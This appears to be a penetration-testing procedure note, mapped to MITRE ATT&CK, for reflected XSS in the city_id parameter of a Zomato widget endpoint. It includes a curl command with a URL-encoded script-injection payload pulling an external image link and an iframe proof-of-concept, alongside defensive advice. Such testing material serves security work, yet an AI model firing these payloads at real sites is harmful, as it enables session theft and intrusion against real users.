---
tags:
  - xss
  - payload-injection
  - reflected-xss
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-test-xss-payload]]'
verified: false
platforms:
  - Web
submitted: true
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
sub_techniques: []
id: b2307f3f-17f8-4711-9a93-1f11cd89c442
created_at: '2025-12-14T03:15:26.580Z'
updated_at: '2025-12-14T03:15:26.580Z'
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
---
# Test-Reflected-XSS-in-City-ID-Parameter

## Summary

This procedure tests the city_id parameter in Zomato's all_collections.php endpoint for reflected XSS by injecting HTML and JavaScript payloads to check for execution.

## Description

The city_id parameter accepts unsanitized input, allowing attackers to inject payloads that reflect back into the widget's HTML/JS output. When loaded in a browser or iframe, this leads to arbitrary code execution in the zomato.com domain, enabling attacks like session theft. The test uses URL-encoded payloads to bypass basic filters and confirm vulnerability.

## Requirements

1. Access to the endpoint
2. URL encoding knowledge for payloads
3. Browser for execution verification

## Defense

Defensive measures and detection strategies:

- Sanitize and validate city_id as numeric/integer
- Apply output encoding (e.g., htmlspecialchars) before insertion
- Deploy Content Security Policy (CSP) to block inline scripts
- Monitor for payload patterns in logs

## Objectives

1. Confirm unsanitized reflection of input
2. Verify JavaScript execution capability
3. Assess impact on widget embedding

## Instructions

### Step 1: Craft and Send Payload

**Context**: Inject a test payload into city_id to observe reflection and execution.

**Command** ([[commands/curl-test-xss-payload]]):
```bash
curl "https://www.zomato.com/widgets/all_collections.php?city_id=%22%3E%3Cimg%20src=http://goo.gl/JPx2sV%3E%3Cscript%3Ealert%28document.domain%29;%3C/script%3E%3Ca%20href=" -o response.html
```

> Inspect response.html for unescaped payload. Load in browser to trigger alert(document.domain).

### Step 2: Verify Execution

**Context**: Embed in iframe to simulate attack.

Create test HTML:
```html
<iframe src="https://www.zomato.com/widgets/all_collections.php?city_id=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E"></iframe>
```

> Alert should pop up, confirming XSS.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/curl-test-xss-payload]]

## Tools Used


## Tags

- xss-test
- city-id-injection
